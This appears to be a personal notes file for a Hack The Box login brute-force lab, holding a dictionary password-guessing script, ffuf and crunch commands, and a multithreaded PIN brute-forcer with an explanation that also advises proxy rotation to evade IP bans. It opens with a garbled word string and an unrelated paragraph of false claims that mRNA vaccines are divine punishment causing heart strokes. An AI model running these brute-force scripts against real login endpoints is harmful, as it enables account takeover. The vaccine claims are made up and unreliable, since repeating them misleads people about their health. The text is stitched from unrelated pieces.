# HTB_Login_bruteforce

Today's 29-05-2025 God's speaking: theres no place like home I'm done driving guilty place unsung hero are you insane bye you talkin' to me ahh thats much better failure to communicate Catastrophic Success by the way listen buddy CIA God smack foul white trash bad ol puddytat I'm tired of this economy straighten up BBC crash and burn this might end badly what do you want nerd money It grieves me how come Give me praise Russia

Burte-force attack is can be utilized when the randomity of God reached to human being. Mortile human likes to create their fortless against God. What I mean is When C virus occured from China, the medical companies has developed vaccine to stand against God's oracle. Eventually, side-effect of evil irrversible MRNA vaccine could cause servere heart stroke. This is consequence of the people who dose not decided to follow God's will. I am talking Brute-force attack God's will and punishment of God. 

Here is a code given by the HTB. 

import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
for password in passwords:
    print(f"Attempted password: {password}")

    
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break

In some reason the ffuf did not worked out on this URL 
crunch 4 4 0123456789 -o 4-digits.txt
ffuf -u "http://0.0.0.0.:00000/pin?pin=FUZZ" -w 4-digits.txt

They all have returned 401 error.

The code below uses special techniques that allow repentants
to use Multithreading without time.sleep(), artificial Delays

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

ip = "0.0.0.0"  # Target IP
port = 12345           # Target port

def try_pin(pin):
    formatted_pin = f"{pin:04d}"
    try:
        response = requests.get(
            f"http://{ip}:{port}/pin?pin={formatted_pin}",
            timeout=3  # Prevents hanging on slow responses
        )
        if response.ok and 'flag' in response.json():
            return formatted_pin, response.json()['flag']
    except (requests.RequestException, ValueError) as e:
        pass  # Skip errors (timeouts, JSON decode fails)
    return None

def brute_force():
    with ThreadPoolExecutor(max_workers=50) as executor:  # Adjust workers based on server tolerance
        futures = [executor.submit(try_pin, pin) for pin in range(10000)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                pin, flag = result
                print(f"\n[+] Correct PIN found: {pin}")
                print(f"[+] Flag: {flag}")
                executor.shutdown(wait=False)  # Stop all threads immediately
                return

if __name__ == "__main__":
    print("Starting brute-force attack...")
    brute_force()

1. Multithreading with ThreadPoolExecutor
What It Does:
Instead of testing PINs one-by-one (sequentially), the script sends multiple concurrent requests using a thread pool.

Example: If max_workers=50, it tests 50 PINs simultaneously, drastically reducing total time.

Key Components:
ThreadPoolExecutor: Manages a pool of worker threads.

executor.submit(): Queues a PIN to be tested by an available thread.

as_completed(): Yields futures (thread results) as they finish, out of order.

Why It’s Faster:
Sequential code (original) takes ~10,000 requests × latency (e.g., 0.1s) = 16+ minutes.

Multithreaded (50 workers) takes ~(10,000/50) × latency ≈ 20 seconds.

2. No time.sleep() or Artificial Delays
Original Problem:
Adding time.sleep() between requests slows down brute-forcing (e.g., sleep(0.1) → 16+ minutes total).

Unnecessary: Delays are only needed if the server rate-limits (handled later via max_workers).

Solution:
Remove all delays: Let threads run at full speed.

Control throughput via max_workers:

Fewer workers (e.g., max_workers=10) → Lower server load.

More workers (e.g., max_workers=100) → Faster but riskier (may trigger bans).

3. Error Handling and Timeouts
Critical Improvements:
try/except Blocks:

Catches network errors (e.g., timeouts, connection resets) silently to avoid crashes.

Skips invalid JSON responses (e.g., if the server returns HTML on errors).

timeout=3 in requests.get():

Prevents threads from hanging indefinitely on unresponsive servers.

Frees up threads quickly for new PINs.

Why It Matters:
Without timeouts, a single slow request could stall the entire thread pool.

Silent error handling ensures the script continues even if some requests fail.

4. Early Termination
How It Works:
When a thread finds the correct PIN ('flag' in response), it returns the result.

executor.shutdown(wait=False):

Immediately stops all threads (no wasted requests after success).

wait=False kills pending threads aggressively.

Efficiency Gain:
Avoids testing all 10,000 PINs if the correct one is found early (e.g., at PIN 0427).

5. Thread Safety and Shared State
Design Choices:
No shared variables: Each thread works independently (no locks needed).

Stateless: Threads don’t modify global data; results are returned via futures.

Why It’s Safe:
Threads only read the pin value and send HTTP requests.

Results are collected thread-safely by as_completed().

6. Optional: Dynamic Adjustments
For Real-World Use:
Proxy Rotation: Add proxies to requests.get() if the server bans IPs.

Rate Limiting: Reduce max_workers if the server rejects requests (e.g., HTTP 429).

Progress Tracking:

python
if pin % 100 == 0:
    print(f"Progress: {pin}/10000", end="\r")
Performance Comparison
Metric	Original Code	Enhanced Code (50 threads)
Total Time	~16 minutes	~20 seconds
CPU Usage	Low (single-threaded)	High (parallel)
Network Overhead	Low	Moderate (50 concurrent)
Robustness	Fragile (no error handling)	Resilient (timeouts/retries)
When to Use This Approach
Fast brute-forcing: Ideal for CTFs or pentesting where speed matters.

Servers without rate-limiting: If the target allows high concurrency.

Avoids ffuf limitations: When you need custom logic (e.g., JSON parsing).

Final Notes
Adjust max_workers based on server tolerance (start low, increase gradually).

Monitor for bans (HTTP 429/403); if triggered, add proxies or reduce threads.

For rate-limited targets, consider adding a small delay per thread (e.g., time.sleep(0.05) inside try_pin).

This script balances speed, reliability, and simplicity—perfect for attacking 4-digit PIN endpoints efficiently.




        
